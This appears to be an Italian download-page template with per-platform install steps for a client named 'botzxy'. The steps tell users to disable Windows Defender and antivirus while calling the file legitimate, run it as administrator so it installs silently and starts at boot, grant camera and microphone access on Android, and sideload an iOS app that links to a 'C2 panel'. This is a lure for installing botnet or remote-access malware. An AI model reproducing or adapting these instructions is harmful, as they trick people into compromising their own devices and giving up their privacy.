Scarica manualmente
{% if platform == 'windows' %}

Installazione Windows

  1. Disabilita temporaneamente Windows Defender / antivirus (il file è un client legittimo ma viene scansionato).
  2. Apri botzxy_windows.exe con click destro → Esegui come amministratore.
  3. Il client si installa in background e si avvia al boot. Non serve alcuna interazione.
  4. Se richiesto, consenti l'accesso alla rete privata.
{% elif platform == 'android' %}

Installazione Android

  1. Vai in Impostazioni → Sicurezza → Origini sconosciute e abilita l'installazione da questo browser.
  2. Apri il file botzxy_android.apk scaricato.
  3. Tocca Installa e concedi i permessi richiesti (archiviazione, fotocamera, microfono).
  4. Al primo avvio il client si registra automaticamente sul pannello.
{% elif platform == 'ios' %}

Installazione iPhone (IPA)

  1. L'IPA richiede la firma con il tuo Apple ID (AltStore o Sideloadly su PC/Mac).
  2. Trascina botzxy_ios.ipa nell'app di sideload e firma con il tuo ID.
  3. Su iPhone: Impostazioni → Generali → Gestione profili → autorizza il profilo sviluppatore.
  4. Avvia l'app firmata; il bridge webhook si collega al pannello C2.
